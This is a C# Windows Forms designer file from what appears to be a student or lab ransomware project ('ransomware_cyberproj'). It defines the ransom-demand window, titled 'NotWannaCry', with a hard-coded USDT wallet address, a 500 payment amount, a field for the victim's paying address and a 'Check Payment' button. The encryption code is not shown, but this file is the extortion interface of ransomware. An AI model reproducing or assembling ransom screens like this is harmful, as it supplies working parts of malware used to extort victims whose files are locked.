namespace ransomware_cyberproj
{
    partial class Form1
    {
        /// <summary>
        ///  Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        ///  Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        ///  Required method for Designer support - do not modify
        ///  the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
            groupBox1 = new GroupBox();
            label4 = new Label();
            button1 = new Button();
            label3 = new Label();
            textBox2 = new TextBox();
            label2 = new Label();
            textBox1 = new TextBox();
            label1 = new Label();
            pictureBox1 = new PictureBox();
            groupBox1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();
            SuspendLayout();
            // 
            // groupBox1
            // 
            groupBox1.Controls.Add(label4);
            groupBox1.Controls.Add(button1);
            groupBox1.Controls.Add(label3);
            groupBox1.Controls.Add(textBox2);
            groupBox1.Controls.Add(label2);
            groupBox1.Controls.Add(textBox1);
            groupBox1.ForeColor = Color.White;
            groupBox1.Location = new Point(40, 240);
            groupBox1.Name = "groupBox1";
            groupBox1.Size = new Size(567, 146);
            groupBox1.TabIndex = 0;
            groupBox1.TabStop = false;
            groupBox1.Text = "Payment Details";
            // 
            // label4
            // 
            label4.AutoSize = true;
            label4.Font = new Font("Segoe UI", 12F, FontStyle.Regular, GraphicsUnit.Point);
            label4.Location = new Point(240, 85);
            label4.Name = "label4";
            label4.Size = new Size(100, 21);
            label4.TabIndex = 7;
            label4.Text = "Amount: 500";
            // 
            // button1
            // 
            button1.ForeColor = Color.Black;
            button1.Location = new Point(454, 85);
            button1.Name = "button1";
            button1.Size = new Size(101, 35);
            button1.TabIndex = 6;
            button1.Text = "Check Payment";
            button1.UseVisualStyleBackColor = true;
            button1.Click += button1_Click;
            // 
            // label3
            // 
            label3.AutoSize = true;
            label3.Font = new Font("Segoe UI", 12F, FontStyle.Regular, GraphicsUnit.Point);
            label3.Location = new Point(19, 58);
            label3.Name = "label3";
            label3.Size = new Size(206, 21);
            label3.TabIndex = 4;
            label3.Text = "USDT Address you paid with";
            // 
            // textBox2
            // 
            textBox2.Location = new Point(240, 56);
            textBox2.Name = "textBox2";
            textBox2.Size = new Size(315, 23);
            textBox2.TabIndex = 5;
            // 
            // label2
            // 
            label2.AutoSize = true;
            label2.Font = new Font("Segoe UI", 12F, FontStyle.Regular, GraphicsUnit.Point);
            label2.Location = new Point(70, 29);
            label2.Name = "label2";
            label2.Size = new Size(155, 21);
            label2.TabIndex = 3;
            label2.Text = "USDT Address to pay";
            // 
            // textBox1
            // 
            textBox1.Location = new Point(240, 27);
            textBox1.Name = "textBox1";
            textBox1.ReadOnly = true;
            textBox1.Size = new Size(315, 23);
            textBox1.TabIndex = 3;
            textBox1.Text = "0x9fda774fd2b1933541da8de406af567a9b204592";
            // 
            // label1
            // 
            label1.AutoSize = true;
            label1.Font = new Font("Segoe UI", 15.75F, FontStyle.Regular, GraphicsUnit.Point);
            label1.ForeColor = Color.White;
            label1.Location = new Point(387, 54);
            label1.Name = "label1";
            label1.Size = new Size(721, 150);
            label1.TabIndex = 1;
            label1.Text = resources.GetString("label1.Text");
            // 
            // pictureBox1
            // 
            pictureBox1.BackgroundImageLayout = ImageLayout.Stretch;
            pictureBox1.Image = Properties.Resources._2889676;
            pictureBox1.Location = new Point(40, 27);
            pictureBox1.Name = "pictureBox1";
            pictureBox1.Size = new Size(261, 207);
            pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
            pictureBox1.TabIndex = 2;
            pictureBox1.TabStop = false;
            // 
            // Form1
            // 
            AutoScaleDimensions = new SizeF(7F, 15F);
            AutoScaleMode = AutoScaleMode.Font;
            BackColor = Color.FromArgb(132, 18, 18);
            ClientSize = new Size(1147, 407);
            Controls.Add(pictureBox1);
            Controls.Add(label1);
            Controls.Add(groupBox1);
            Name = "Form1";
            Text = "NotWannaCry";
            Load += Form1_Load;
            groupBox1.ResumeLayout(false);
            groupBox1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)pictureBox1).EndInit();
            ResumeLayout(false);
            PerformLayout();
        }

        #endregion

        private GroupBox groupBox1;
        private Label label1;
        private PictureBox pictureBox1;
        private Label label2;
        private TextBox textBox1;
        private Label label3;
        private TextBox textBox2;
        private Button button1;
        private Label label4;
    }
}